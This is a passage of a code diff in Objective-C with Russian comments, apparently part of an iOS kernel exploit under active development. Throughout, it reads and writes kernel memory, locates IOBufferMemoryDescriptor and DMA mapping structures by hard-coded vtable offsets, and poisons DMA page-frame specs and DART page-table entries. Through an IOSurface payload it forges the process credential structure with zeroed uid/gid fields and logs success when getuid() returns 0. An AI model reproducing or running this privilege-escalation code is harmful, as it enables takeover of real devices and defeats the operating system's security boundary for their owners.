+        // mapObj=[cmd+0x70] → DVA=[mapObj+0xa0], len=[+0xa8].
+        uint64_t node = kpLooksLikeKernelPointer(pipeVA) ? kp_untag_ptr(early_kread64(pipeVA + 0x178)) : 0;
+        uint32_t ncount = kpLooksLikeKernelPointer(pipeVA) ? ((uint32_t)early_kread64(pipeVA + 0x180) & 0xff) : 0;
+        kpNote(r, [NSString stringWithFormat:@"  [P2] mapping-список: head=%#llx count=%u",
+                  (unsigned long long)node, ncount]);
+        // 1.9.235: CLASS-DISCOVERY per-op IOBufferMD (владелец spec) — очереди и
+        // credit мертвы (op=0 всех походов, sel10 не ложится). Скан mapping-нод на
+        // vtable == 0x7b33db8 (IOBufferMemoryDescriptor): наш desc → [desc+0x60] =
+        // ranges-spec → +0x58 pfn32 = patch-point. Точная дискавери по классу.
+        {
+            uint64_t node235 = node;
+            int nFound = 0;
+            for (uint32_t ni = 0; ni < 8 && kpLooksLikeKernelPointer(node235) && kpSafeToRead(node235) && !nSpec; ni++) {
+                for (uint32_t o = 0; o + 8 <= 0xa0 && !nSpec; o += 8) {
+                    uint64_t Q = kp_untag_ptr(early_kread64(node235 + o));
+                    if (!kpLooksLikeKernelPointer(Q) || !kpSafeToRead(Q)) continue;
+                    uint64_t vt = kp_untag_ptr(early_kread64(Q));
+                    if ((uint32_t)(vt ? vt - kslide2 : 0) != 0x7b33db8) continue;
+                    nFound++;
+                    uint64_t spec235 = kp_untag_ptr(early_kread64(Q + 0x60));
+                    uint64_t v = (kpLooksLikeKernelPointer(spec235) && kpSafeToRead(spec235)) ? early_kread64(spec235 + 0x58) : 0;
+                    kpNote(r, [NSString stringWithFormat:@"  [DSC] ★ IOBufferMD node[%u]+%#x=%#llx spec=%#llx +0x58=%#018llx",
+                              ni, o, (unsigned long long)Q, (unsigned long long)spec235, (unsigned long long)v]);
+                    if ((uint32_t)v == pfn32) {
+                        uint64_t nq = (v & 0xffffffff00000000ULL) | ctlPFN;
+                        kpNote(r, [NSString stringWithFormat:@"  [DSC] ★★ spec+0x58 через класс: %#018llx → %#018llx", (unsigned long long)v, (unsigned long long)nq]);
+                        usleep(2000);
+                        early_kwrite64(spec235 + 0x58, nq);
+                        uint64_t rb = early_kread64(spec235 + 0x58);
+                        kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb, rb == nq ? @"ПРИЛИПЛО" : @"МИМО"]);
+                        specVA[nSpec] = spec235 + 0x58; specOld[nSpec] = v; nSpec++;
+                    } else if (kpLooksLikeKernelPointer(spec235) && kpSafeToRead(spec235)) {
+                        for (uint32_t o2 = 0; o2 + 8 <= 0x64; o2 += 8)
+                            kpNote(r, [NSString stringWithFormat:@"    dsc-spec+%#x: %#018llx", o2, (unsigned long long)early_kread64(spec235 + o2)]);
+                    }
+                }
+                uint64_t nx = kp_untag_ptr(early_kread64(node235 + 0x20));
+                if (!kpLooksLikeKernelPointer(nx) || nx == node235) nx = kp_untag_ptr(early_kread64(node235 + 0x10));
+                if (!kpLooksLikeKernelPointer(nx) || nx == node235) nx = kp_untag_ptr(early_kread64(node235 + 0x8));
+                if (!kpLooksLikeKernelPointer(nx) || nx == node235) break;
+                node235 = nx;
+            }
+            if (!nFound) kpNote(r, @"  [DSC] IOBufferMD (0x7b33db8) в нодах нет — desc по другой цепи");
+        }
+        for (uint32_t ni = 0; ni < 32 && kpLooksLikeKernelPointer(node) && kpSafeToRead(node) && !cmdVA; ni++) {
+            if ((uint32_t)(node & 0x3fff) + 0xa0 > 0x4000) break;
+            // 1.9.185: дамп всех qwords ноды (0xA0): ищем cmd (vt 0x7afa9e8) и
+            // DVA-кандидаты (page-aligned, < 4TB DART-space). У head-ноды на
+            // +0x18 лежало 0x10122000000 — пробуем через walk (PTE-маска решит).
+            for (uint32_t o = 0; o + 8 <= 0xa0; o += 8) {
+                uint64_t q = early_kread64(node + o);
+                uint64_t u = kp_untag_ptr(q);
+                if (kpLooksLikeKernelPointer(u) && kpSafeToRead(u)) {
+                    uint64_t pvt = kp_untag_ptr(early_kread64(u));
+                    if ((uint32_t)(pvt ? pvt - kslide2 : 0) == 0x7afa9e8) {
+                        uint64_t mObj = kp_untag_ptr(early_kread64(u + 0x70));
+                        uint64_t dv2 = 0, ln2 = 0;
+                        if (kpLooksLikeKernelPointer(mObj) && kpSafeToRead(mObj)) {
+                            dv2 = early_kread64(mObj + 0xa0);
+                            ln2 = early_kread64(mObj + 0xa8);
+                        }
+                        kpNote(r, [NSString stringWithFormat:@"    нода[%u]+%#x → cmd=%#llx mapObj=%#llx DVA=%#llx len=%#llx%@",
+                                  ni, o, (unsigned long long)u, (unsigned long long)mObj,
+                                  (unsigned long long)dv2, (unsigned long long)ln2,
+                                  (dv2 && (ln2 == 0x1000 || ln2 == 0x4000)) ? @" ← НАШ ✓" : @""]);
+                        if (dv2 && (ln2 == 0x1000 || ln2 == 0x4000) && !cmdVA) { cmdVA = u; dva = dv2; dvaLen = ln2; }
+                    }
+                }
+                // DVA-кандидат: page-aligned, в окне [4GB, 4TB), ненулевой — walk
+                if (q && !(q & 0x3fff) && q >= 0x100000000ULL && q < 0x40000000000ULL && !dva) {
+                    kpNote(r, [NSString stringWithFormat:@"    нода[%u]+%#x: DVA-кандидат %#llx — пробуем", ni, o, (unsigned long long)q]);
+                    dva = q;
+                }
+            }
+            if (cmdVA) break;
+            uint64_t nx = kp_untag_ptr(early_kread64(node + 0x20));
+            if (!kpLooksLikeKernelPointer(nx) || nx == node) nx = kp_untag_ptr(early_kread64(node + 0x10));
+            if (!kpLooksLikeKernelPointer(nx) || nx == node) nx = kp_untag_ptr(early_kread64(node + 0x8));
+            if (!kpLooksLikeKernelPointer(nx) || nx == node) break;
+            node = nx;
+        }
+        // 1.9.225: SPEC-скан по зоне вокруг драйвер-объектов — [pd+0x60] оказался
+        // массивом VA/len sub-MD (не спек р.55). Спек = kalloc-объект драйвера,
+        // кластерится с pipe/dart/нодами. После execute#1 pfn УЖЕ в спеке —
+        // ищем его голым/упакованным по окну ±32MB, патчим, retry вооружён.
+        {
+            uint64_t specCand[8]; uint32_t specCandForm[8];
+            int nSC = 0;
+            uint64_t anchors225[8]; int na225 = 0;
+            if (kpLooksLikeKernelPointer(pipeVA)) anchors225[na225++] = pipeVA;
+            if (kpLooksLikeKernelPointer(mapVA)) anchors225[na225++] = mapVA;
+            if (kpLooksLikeKernelPointer(dartVA)) anchors225[na225++] = dartVA;
+            if (kpLooksLikeKernelPointer(node)) anchors225[na225++] = node;
+            uint64_t mn225 = ~0ULL, mx225 = 0;
+            for (int a = 0; a < na225; a++) { if (anchors225[a] < mn225) mn225 = anchors225[a]; if (anchors225[a] > mx225) mx225 = anchors225[a]; }
+            if (na225 && mn225 != ~0ULL) {
+                uint64_t lo = (mn225 & ~0x3fffULL) - 0x2000000ULL, hi = (mx225 & ~0x3fffULL) + 0x2000000ULL;
+                int nPg = 0, nMp = 0;
+                for (uint64_t pg = lo; pg < hi && nSC < 8; pg += 0x4000) {
+                    nPg++;
+                    if (!kpSafeToRead(pg)) continue;
+                    // 1.9.226: контент ТОЛЬКО типов {0x21,0x6,0xc} (PPL-read-страницы в табличных типах)
+                    uint64_t ppa226 = kvtophys(pg);
+                    int pft226 = ppa226 ? kpFrameTypeOf(ppa226) : -1;
+                    if (!(pft226 == 0x21 || pft226 == 0x6 || pft226 == 0xc)) continue;
+                    nMp++;
+                    uint8_t sbuf[0x4000];
+                    kreadbuf(pg, sbuf, sizeof(sbuf));
+                    for (uint32_t o = 0; o + 8 <= sizeof(sbuf) && nSC < 8; o += 8) {
+                        uint64_t q = 0; memcpy(&q, sbuf + o, 8);
+                        int frm = 0;
+                        if (q == (uint64_t)pfn32) frm = 2;
+                        else if (q == backingPA) frm = 1;
+                        else if ((uint32_t)(q >> 32) == pfn32 && (q & 0xffffffffULL) == 1) frm = 3;
+                        // 1.9.228: + упакованная форма (lo32=pfn, hi32 < 0x10000 — spec-поля с флагами/счётчиком)
+                        else if ((uint32_t)q == pfn32 && (q >> 32) && (q >> 32) < 0x10000ULL) frm = 4;
+                        if (!frm) continue;
+                        BOOL vtNear = NO;
+                        for (int d = -2; d <= 2 && !vtNear; d++) {
+                            if (!d) continue;
+                            long oo = (long)o + d * 8;
+                            if (oo < 0 || oo + 8 > (long)sizeof(sbuf)) continue;
+                            uint64_t nv = kp_untag_ptr(*(uint64_t *)(sbuf + oo));
+                            if (nv >= kconstant(base) && nv < kconstant(base) + 0x6000000ULL) vtNear = YES;
+                        }
+                        if (vtNear) continue;
+                        specCand[nSC] = pg + o; specCandForm[nSC] = frm;
+                        uint64_t nq = (frm == 1) ? ((q & 0x3fffULL) | ctlPA)
+                                    : (frm == 2) ? (uint64_t)ctlPFN
+                                    : (frm == 4) ? ((q & 0xffffffff00000000ULL) | ctlPFN)
+                                    : (((uint64_t)ctlPFN << 32) | (q & 0xffffffffULL));
+                        kpNote(r, [NSString stringWithFormat:@"  [SPC-Z] ★ кандидат форма%d @ %#llx: %#018llx → %#018llx",
+                                  frm, (unsigned long long)(pg + o), (unsigned long long)q, (unsigned long long)nq]);
+                        usleep(2000);
+                        early_kwrite64(pg + o, nq);
+                        uint64_t rb = early_kread64(pg + o);
+                        kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb, rb == nq ? @"ПРИЛИПЛО" : @"МИМО"]);
+                        nSC++;
+                    }
+                }
+                kpNote(r, [NSString stringWithFormat:@"  [SPC-Z] окно: страниц=%d mapped=%d кандидатов=%d", nPg, nMp, nSC]);
+                if (nSC) {
+                    kern_return_t skr = IOConnectCallMethod(victim, 1, NULL, 0, tsdV, sizeof(tsdV), NULL, NULL, NULL, NULL);
+                    kpNote(r, [NSString stringWithFormat:@"  [SPC-Z] armed submit kr=0x%x — жду execute по отравленному spec", skr]);
+                    usleep(400000);
+                    int chS = 0;
+                    for (uint32_t i = 0; i < 0x4000; i += 4) {
+                        uint32_t px = *(volatile uint32_t *)(ctl + i);
+                        if (px != 0xCCCCCCCC && px != 0) chS++;
+                    }
+                    kpNote(r, [NSString stringWithFormat:@"  [SPC-Z] ctl changed=%d — %@", chS,
+                              chS ? @"★★★ CONFIRMED через spec-яд!" : @"кандидаты мимо (не тот spec)"]);
+                    if (chS) changed = chS;
+                    if (chS) {
+                        // ФОРЖ: те же кандидаты → ucredPA, src = payload (механика 1.9.208)
+                        uint64_t prF3 = 0, roF3 = 0, ucF3 = 0;
+                        if (selfProcM) {
+                            prF3 = early_kread64(selfProcM + koffsetof(proc, proc_ro));
+                            roF3 = prF3 ? kp_untag_ptr(prF3) : 0;
+                            ucF3 = roF3 ? kp_untag_ptr(early_kread64(roF3 + koffsetof(proc_ro, ucred))) : 0;
+                        }
+                        uint64_t upageVA3 = ucF3 & ~0x3fffULL;
+                        uint32_t uoff3 = (uint32_t)(ucF3 & 0x3fff);
+                        uint64_t upagePA3 = kpLooksLikeKernelPointer(ucF3) ? kvtophys(upageVA3) : 0;
+                        uint64_t upkva3 = upagePA3 ? phystokv(upagePA3) : 0;
+                        BOOL uOK3 = upkva3 && early_kread64(upkva3) == early_kread64(upageVA3) &&
+                                    (uint32_t)early_kread64(upkva3 + uoff3 + 0x18) == (uint32_t)getuid() && uoff3 + 0xc0 <= 0x1000;
+                        kpNote(r, [NSString stringWithFormat:@"  [SPC-Z-F] ucred=%#llx upagePA=%#llx — валидация: %@", (unsigned long long)ucF3, (unsigned long long)upagePA3, uOK3 ? @"СОШЛАСЬ" : @"НЕ СОШЛАСЬ"]);
+                        if (uOK3) {
+                            uint8_t fbuf3[0x1000];
+                            for (uint32_t i = 0; i < 0x1000; i += 8) *(uint64_t *)(fbuf3 + i) = early_kread64(upageVA3 + i);
+                            *(uint32_t *)(fbuf3 + uoff3 + 0x18) = 0;
+                            *(uint32_t *)(fbuf3 + uoff3 + 0x1c) = 0;
+                            *(uint32_t *)(fbuf3 + uoff3 + 0x20) = 0;
+                            *(uint32_t *)(fbuf3 + uoff3 + 0x28) = 0;
+                            *(uint32_t *)(fbuf3 + uoff3 + 0x68) = 0;
+                            *(uint32_t *)(fbuf3 + uoff3 + 0x6c) = 0;
+                            *(uint64_t *)(fbuf3 + uoff3 + 0x78) = 0;
+                            IOSurfaceLock(srcS, 0, NULL);
+                            uint8_t *sp4 = (uint8_t *)IOSurfaceGetBaseAddress(srcS);
+                            if (sp4) memcpy(sp4, fbuf3, 0x1000);
+                            IOSurfaceUnlock(srcS, 0, NULL);
+                            uint32_t fPFN3 = (uint32_t)(upagePA3 >> 14);
+                            for (int i = 0; i < nSC; i++) {
+                                uint64_t cur = early_kread64(specCand[i]);
+                                uint64_t nq = (specCandForm[i] == 1) ? ((cur & 0x3fffULL) | upagePA3)
+                                            : (specCandForm[i] == 2) ? (uint64_t)fPFN3
+                                            : (specCandForm[i] == 4) ? ((cur & 0xffffffff00000000ULL) | fPFN3)
+                                            : (((uint64_t)fPFN3 << 32) | (cur & 0xffffffffULL));
+                                early_kwrite64(specCand[i], nq);
+                            }
+                            kern_return_t fkr3 = IOConnectCallMethod(victim, 1, NULL, 0, tsdV, sizeof(tsdV), NULL, NULL, NULL, NULL);
+                            kpNote(r, [NSString stringWithFormat:@"  [SPC-Z-F] forge-submit kr=0x%x — DMA в ucred", fkr3]);
+                            usleep(400000);
+                            uid_t gu3 = getuid(); gid_t gg3 = getgid();
+                            uint32_t cru3 = (uint32_t)early_kread64(ucF3 + 0x18);
+                            kpNote(r, [NSString stringWithFormat:@"  [SPC-Z-F] getuid()=%u getgid()=%u cr_uid=%u", gu3, gg3, cru3]);
+                            if (gu3 == 0) kpNote(r, @"=== ROOT ДОСТИГНУТ: getuid()==0 — spec-яд форж ucred РАБОТАЕТ ===");
+                        }
+                    }
+                }
+            }
+        }
+        if (cmdVA) {
+            uint64_t mapObj = kp_untag_ptr(early_kread64(cmdVA + 0x70));
+            if (kpLooksLikeKernelPointer(mapObj) && kpSafeToRead(mapObj)) {
+                dva = early_kread64(mapObj + 0xa0);
+                dvaLen = early_kread64(mapObj + 0xa8);
+                kpNote(r, [NSString stringWithFormat:@"  [P2] IODMACommand=%#llx mapObj=%#llx DVA=%#llx len=%#llx",
+                          (unsigned long long)cmdVA, (unsigned long long)mapObj,
+                          (unsigned long long)dva, (unsigned long long)dvaLen]);
+            }
+        }
+        if (dva && kpLooksLikeKernelPointer(dartVA)) {
+            uint64_t dvt = kp_untag_ptr(early_kread64(dartVA));
+            kpNote(r, [NSString stringWithFormat:@"  [P2] dart=%#llx vt=%#llx (file %#llx; ждём 0x7dafcb0)%@",
+                      (unsigned long long)dartVA, (unsigned long long)dvt,
+                      (unsigned long long)(dvt ? dvt - kslide2 : 0),
+                      (uint32_t)(dvt - kslide2) == 0x7dafcb0 ? @" ✓" : @""]);
+            // 1.9.186: bounds у table struct'ов пустые — bounds-гейт УБРАН: идём
+            // по ВСЕМ корням {ts[i], [ts[i]+0x80]} напрямую, walk по каждому;
+            // PTE PA-маска (backingPA) сама выбирает правильный корень и слот.
+            uint64_t roots[8] = {0};
+            int nroots = 0;
+            for (uint32_t i = 0; i < 8 && nroots < 8; i++) {
+                uint64_t ts = kp_untag_ptr(early_kread64(dartVA + 0xcd0 + (uint64_t)i * 8));
+                if (!kpLooksLikeKernelPointer(ts) || !kpSafeToRead(ts)) continue;
+                if ((uint32_t)(ts & 0x3fff) + 0x88 > 0x4000) continue;
+                roots[nroots++] = ts;
+                uint64_t leafS = kp_untag_ptr(early_kread64(ts + 0x80));
+                if (kpLooksLikeKernelPointer(leafS) && kpSafeToRead(leafS) && nroots < 8) roots[nroots++] = leafS;
+                uint64_t lo = early_kread64(ts + 0x20), hi = early_kread64(ts + 0x28);
+                kpNote(r, [NSString stringWithFormat:@"  [P2] table struct [%u]=%#llx range [%#llx..%#llx) +0x80=%#llx",
+                          i, (unsigned long long)ts, (unsigned long long)lo, (unsigned long long)hi, (unsigned long long)leafS]);
+            }
+            // 1.9.187 (р.48): корни из ПЕРСИСТЕНТНОГО состояния DART —
+            // shadow [dartObj+0x17f8..0x1870]: объекты со значением [obj+0x10]
+            // (OSNumber); TTBR-подобное значение (page-aligned PA) → root=phystokv.
+            // ctx [dartObj+0xc10] дампим для глаз.
+            // 1.9.188: shadow пуст — корень ищем в CTX (р.48: ctx+0x18/0x28/… +
+            // массивы ctx+0x90×4, +0xb0×8, OSNumber-значения [obj+0x10]). Дамп
+            // ctx 0x100 + чтение значений объектов из его массивов → TTBR-roots.
+            uint64_t ctx = kpLooksLikeKernelPointer(dartVA) ? kp_untag_ptr(early_kread64(dartVA + 0xc10)) : 0;
+            kpNote(r, [NSString stringWithFormat:@"  [P2] ctx=[dartObj+0xc10]=%#llx — ctx-scan:",
+                      (unsigned long long)ctx]);
+            if (kpLooksLikeKernelPointer(ctx) && kpSafeToRead(ctx)) {
+                for (uint32_t o = 0; o + 8 <= 0x100 && nroots < 8; o += 8) {
+                    uint64_t P = kp_untag_ptr(early_kread64(ctx + o));
+                    if (!kpLooksLikeKernelPointer(P) || !kpSafeToRead(P)) continue;
+                    uint64_t val = early_kread64(P + 0x10);
+                    if (!val) continue;
+                    kpNote(r, [NSString stringWithFormat:@"    ctx+%#x: obj=%#llx [+0x10]=%#llx%@",
+                              o, (unsigned long long)P, (unsigned long long)val,
+                              (!(val & 0x3fff) && val >= 0x1000 && val < 0x40000000000ULL) ? @" ← TTBR-кандидат" : @""]);
+                    if (!(val & 0x3fff) && val >= 0x1000 && val < 0x40000000000ULL) {
+                        uint64_t tva = phystokv(val);
+                        if (kpLooksLikeKernelPointer(tva) && kpSafeToRead(tva)) roots[nroots++] = tva;
+                    }
+                }
+                // массивы ctx+0x90 (×4) и ctx+0xb0 (×8): объекты → [obj+0x10]
+                for (uint32_t base = 0x90; base <= 0xb0 && nroots < 8; base += 0x20) {
+                    uint64_t arrP = kp_untag_ptr(early_kread64(ctx + base));
+                    if (!kpLooksLikeKernelPointer(arrP) || !kpSafeToRead(arrP)) continue;
+                    for (uint32_t j = 0; j < 8 && nroots < 8; j++) {
+                        uint64_t P = kp_untag_ptr(early_kread64(arrP + (uint64_t)j * 8));
+                        if (!kpLooksLikeKernelPointer(P) || !kpSafeToRead(P)) continue;
+                        uint64_t val = early_kread64(P + 0x10);
+                        if (!(val & 0x3fff) && val >= 0x1000 && val < 0x40000000000ULL) {
+                            kpNote(r, [NSString stringWithFormat:@"    ctx+%#x[%u]: obj=%#llx [+0x10]=%#llx ← TTBR-кандидат",
+                                      base, j, (unsigned long long)P, (unsigned long long)val]);
+                            uint64_t tva = phystokv(val);
+                            if (kpLooksLikeKernelPointer(tva) && kpSafeToRead(tva)) roots[nroots++] = tva;
+                        }
+                    }
+                }
+            }
+            uint64_t pageIdx = dva >> 14;
+            uint32_t idxs[4] = { (uint32_t)((pageIdx & 0x3e00000000ULL) >> 33),
+                                 (uint32_t)((pageIdx & 0x1ffc00000ULL) >> 22),
+                                 (uint32_t)((pageIdx & 0x3ff800ULL) >> 11),
+                                 (uint32_t)(pageIdx & 0x7ff) };
+            kpNote(r, [NSString stringWithFormat:@"  [P2] walk: DVA=%#llx pageIdx=%#llx idx L0=%u L1=%u L2=%u leaf=%u (корней=%d)",
+                      (unsigned long long)dva, (unsigned long long)pageIdx,
+                      idxs[0], idxs[1], idxs[2], idxs[3], nroots]);
+            for (int ri = 0; ri < nroots && !pteVA; ri++) {
+                uint64_t tbl = roots[ri];
+                for (int lvl = 0; lvl < 4 && !pteVA; lvl++) {
+                    uint64_t ent = early_kread64(tbl + (uint64_t)idxs[lvl] * 8);
+                    kpNote(r, [NSString stringWithFormat:@"    root%d L%d[%u] @ %#llx = %#018llx", ri, lvl, idxs[lvl],
+                              (unsigned long long)(tbl + (uint64_t)idxs[lvl] * 8), (unsigned long long)ent]);
+                    if (lvl == 3) {
+                        if (ent && (ent & 1)) {
+                            pteVA = tbl + (uint64_t)idxs[3] * 8;
+                            origPTE = ent;
+                        }
+                        break;
+                    }
+                    if (!(ent & 1)) break;
+                    tbl = (ent << 4) & 0x3ffffffc000ULL;
+                    if (!kpLooksLikeKernelPointer(tbl) || !kpSafeToRead(tbl)) break;
+                }
+            }
+            if (pteVA) {
+                // 1.9.190: точные кодировки in-place (A[12:47]/C[14:41]) — регион-маска
+                // [25:41] матчила ASCII-мусор в kernel data ("eric121") → kwrite в
+                // kernel image → phys-aperture panic 23:02. Только точный PA.
+                if ((origPTE & 0x0000FFFFFFFFF000ULL) == backingPA && (origPTE & ~0x0000FFFFFFFFF000ULL)) {
+                    ptePAMask = 0x0000FFFFFFFFF000ULL;
+                    kpNote(r, @"  [P2] ★ PTE PA совпал с backingPA (кодировка A) — патчим");
+                } else if ((origPTE & 0x000003FFFFFFC000ULL) == backingPA && (origPTE & ~0x000003FFFFFFC000ULL)) {
+                    ptePAMask = 0x000003FFFFFFC000ULL;
+                    kpNote(r, @"  [P2] ★ PTE PA совпал с backingPA (кодировка C) — патчим");
+                } else {
+                    kpNote(r, [NSString stringWithFormat:@"  [P2] PTE %#018llx ≠ backingPA точно — НЕ патчим (ложный матч)",
+                              (unsigned long long)origPTE]);
+                    pteVA = 0;
+                }
+            } else {
+                kpNote(r, @"  [P2] ни один корень не дал валидный leaf (bit0) для DVA");
+            }
+        }
+        // 1.9.190 (agent-45 р.50): ДЕТЕРМИНИРОВАННЫЙ walk — корни в MAPPER'е:
+        // [mapper+0x170+segIdx*8] = per-seg struct, L0 embedded @ +0x00, bounds
+        // [s+0x20] ≤ DVA < [s+0x28] выбирают segIdx; count [mapper+0xa54].
+        if (!pteVA && kpLooksLikeKernelPointer(mapVA) && dva) {
+            uint64_t pageIdx25 = dva >> 14;
+            uint32_t idxs[4] = { (uint32_t)((pageIdx25 & 0x3e00000000ULL) >> 33),
+                                 (uint32_t)((pageIdx25 & 0x1ffc00000ULL) >> 22),
+                                 (uint32_t)((pageIdx25 & 0x3ff800ULL) >> 11),
+                                 (uint32_t)(pageIdx25 & 0x7ff) };
+            uint32_t segCnt = (uint32_t)(early_kread64(mapVA + 0xa54) & 0xffff);
+            if (segCnt > 16) segCnt = 16;
+            kpNote(r, [NSString stringWithFormat:@"  [P2.5] mapper-walk: segCnt=%u", segCnt]);
+            for (uint32_t sg = 0; sg < segCnt && !pteVA; sg++) {
+                uint64_t s = kp_untag_ptr(early_kread64(mapVA + 0x170 + (uint64_t)sg * 8));
+                if (!kpLooksLikeKernelPointer(s) || !kpSafeToRead(s)) continue;
+                uint64_t bLo = early_kread64(s + 0x20), bHi = early_kread64(s + 0x28);
+                kpNote(r, [NSString stringWithFormat:@"    seg[%u]=%#llx bounds [%#llx..%#llx)%@", sg,
+                          (unsigned long long)s, (unsigned long long)bLo, (unsigned long long)bHi,
+                          (dva >= bLo && dva < bHi) ? @" ← НАШ" : @""]);
+                if (!(dva >= bLo && dva < bHi)) continue;
+                uint64_t tbl = s;   // L0 embedded @ struct+0x00
+                for (int lvl = 0; lvl < 4 && !pteVA; lvl++) {
+                    uint64_t ent = early_kread64(tbl + (uint64_t)idxs[lvl] * 8);
+                    kpNote(r, [NSString stringWithFormat:@"    seg%d L%d[%u] @ %#llx = %#018llx", sg, lvl, idxs[lvl],
+                              (unsigned long long)(tbl + (uint64_t)idxs[lvl] * 8), (unsigned long long)ent]);
+                    if (lvl == 3) {
+                        if (ent && (ent & 1) &&
+                            (((ent & 0x0000FFFFFFFFF000ULL) == backingPA && (ent & ~0x0000FFFFFFFFF000ULL)) ||
+                             ((ent & 0x000003FFFFFFC000ULL) == backingPA && (ent & ~0x000003FFFFFFC000ULL)))) {
+                            pteVA = tbl + (uint64_t)idxs[3] * 8;
+                            origPTE = ent;
+                            ptePAMask = ((ent & 0x0000FFFFFFFFF000ULL) == backingPA) ? 0x0000FFFFFFFFF000ULL : 0x000003FFFFFFC000ULL;
+                            kpNote(r, @"  [P2.5] ★ PTE через mapper-walk — PA точный, патчим");
+                        }
+                        break;
+                    }
+                    if (!(ent & 1)) break;
+                    tbl = (ent << 4) & 0x3ffffffc000ULL;
+                    if (!kpLooksLikeKernelPointer(tbl) || !kpSafeToRead(tbl)) break;
+                }
+            }
+            if (!pteVA) kpNote(r, @"  [P2.5] mapper-walk: leaf не найден / PA не сошёлся");
+        }
+        // 1.9.172: FALLBACK — PTE сканом по таблицам от ТЕРМИНАЛЬНОГО dartObj
+        // (cmd/op-entry не нужны): mapping персистит, PTE в leaf-таблице;
+        // указатели под kvtophys-гейтом (1.9.162 ребутил без гейта на Nub'е —
+        // теперь правильный терминальный объект + гейты).
+        if (!pteVA && kpLooksLikeKernelPointer(dartVA)) {
+            uint64_t gptrs[32];
+            int gn = 0, gskip = 0;
+            for (uint32_t o = 0; o + 8 <= 0x1000 && gn < 32; o += 8) {
+                uint64_t p = kp_untag_ptr(early_kread64(dartVA + o));
+                if (!kpLooksLikeKernelPointer(p)) continue;
+                BOOL dup = NO;
+                for (int j = 0; j < gn; j++) if (gptrs[j] == p) { dup = YES; break; }
+                if (dup) continue;
+                if (!kpSafeToRead(p)) { gskip++; continue; }
+                gptrs[gn++] = p;
+            }
+            kpNote(r, [NSString stringWithFormat:@"  [P2] dartObj: %d указателей (гейт отсеял %d) — скан страниц на PTE (PA-маска)", gn, gskip]);
+            // 1.9.174: многоуровневый скан — leaf-таблицы на 2-3 хопа ниже корней.
+            // valid=bit0, child VA=(entry<<4)&0x3ffffffc000 (р.38). Visited-cap
+            // 64 + kvtophys на каждой странице — безопасно и без зацикливания.
+            __block int nvis = 0;
+            uint64_t *visited = (uint64_t *)malloc(64 * sizeof(uint64_t));   // heap-указатель: блоки массивы не захватывают (CI error 6831)
+            __block void (^scanTbl)(uint64_t, int);
+            scanTbl = ^void(uint64_t tblVA, int depth) {
+                if (pteVA || depth > 3) return;
+                if (!kpSafeToRead(tblVA)) return;
+                BOOL seen = NO;
+                for (int v = 0; v < nvis; v++) if (visited[v] == tblVA) { seen = YES; break; }
+                if (seen) return;
+                if (nvis < 64) visited[nvis++] = tblVA;
+                uint32_t lim = 0x4000 - (uint32_t)(tblVA & 0x3fff);
+                for (uint32_t o = 0; o + 8 <= lim && !pteVA; o += 8) {
+                    uint64_t q = early_kread64(tblVA + o);
+                    // 1.9.190: ТОЧНЫЙ in-place PA (A/C) — регион-маска [25:41] на
+                    // ASCII "eric121" в kernel data дала ложный PTE → kwrite в
+                    // kernel image → phys-aperture panic. Рыхлое — только репорт.
+                    BOOL exA = ((q & 0x0000FFFFFFFFF000ULL) == backingPA) && (q & ~0x0000FFFFFFFFF000ULL);
+                    BOOL exC = !exA && ((q & 0x000003FFFFFFC000ULL) == backingPA) && (q & ~0x000003FFFFFFC000ULL);
+                    if (exA || exC) {
+                        pteVA = tblVA + o;
+                        origPTE = q;
+                        ptePAMask = exA ? 0x0000FFFFFFFFF000ULL : 0x000003FFFFFFC000ULL;
+                        kpNote(r, [NSString stringWithFormat:@"  [P2] ★ PTE @ %#llx (глубина %d): %#018llx — ТОЧНЫЙ матч (%@)",
+                                  (unsigned long long)pteVA, depth, (unsigned long long)q, exA ? @"A" : @"C"]);
+                        return;
+                    }
+                    if ((q & 0x000003FFFE000000ULL) == (backingPA & 0x000003FFFE000000ULL) &&
+                        (q & ~0x000003FFFE000000ULL)) {
+                        kpNote(r, [NSString stringWithFormat:@"  [P2] рыхлый кандидат @ %#llx (глубина %d): %#018llx — НЕ патчим",
+                                  (unsigned long long)(tblVA + o), depth, (unsigned long long)q]);
+                    }
+                    if (depth < 3 && (q & 1)) {
+                        uint64_t child = (q << 4) & 0x3ffffffc000ULL;
+                        if (kpLooksLikeKernelPointer(child) && child != tblVA) scanTbl(child, depth + 1);
+                        if (pteVA) return;
+                    }
+                }
+            };
+            for (int g = 0; g < gn && !pteVA; g++) scanTbl(gptrs[g], 0);
+            if (!pteVA) kpNote(r, [NSString stringWithFormat:@"  [P2] многоуровневый скан: %d страниц обойдено, PTE нет", nvis]);
+            free(visited);
+        }
+        // 1.9.189: FALLBACK 2 — PTE контент-сканом по frame-table. Корни/ctx
+        // мертвы (три прогона L0[0]=0), но mapping персистит на pipe → leaf-PTE
+        // существует и несёт backingPA почти открытым текстом. Типы {8,9,13,17,
+        // c,6} census-выжившие + 0x21 (объекты, кап) — 0xb/0x37 deadly. SCAN A
+        // выше не в счёт: там инвертирован рет kreadbuf (шим всегда 0) — буфер
+        // читался и выбрасывался, анализ не выполнялся НИ РАЗУ.
+        if (!pteVA) {
+            uint64_t ftVA = gFrameTableVA ? gFrameTableVA : [self frameTableVAWithLog:r];
+            uint64_t totalPages = kconstant(physSize) >> 14;
+            uint64_t srcPA = spix ? vtophys(ttM, (uint64_t)spix) : 0;
+            int nCand = 0, nScanned = 0, nLoose = 0, nCap = 0;
+            static uint8_t ftChunk[0x10000];   // 4096 фреймов за проход
+            // 1.9.194: МЕТА-ЗАХВАТ перед боем — каждый кандидат окна с полными
+            // 16 байтами фрейм-записи (q0/q1), БЕЗ контент-чтений (метаданные
+            // безопасны — census). Если контент-скан умрёт, первый кандидат
+            // мета-захвата выше последней строки скана = убийца, и его q0/q1
+            // у нас в руках → дискриминирующий бит против безопасных страниц.
+            if (ftVA) {
+                int nMeta = 0;
+                for (uint64_t fb = 0; fb < totalPages; fb += 4096) {
+                    uint64_t nent = totalPages - fb; if (nent > 4096) nent = 4096;
+                    kreadbuf(ftVA + fb * 16, ftChunk, (size_t)(nent * 16));
+                    for (uint64_t e = 0; e < nent; e++) {
+                        uint8_t t = ftChunk[e * 16 + 2];
+                        BOOL rare = (t == 0x8 || t == 0x9 || t == 0x13 || t == 0x17 || t == 0xc || t == 0x6);
+                        if (!rare) continue;
+                        uint64_t pa = kconstant(physBase) + (fb + e) * 0x4000;
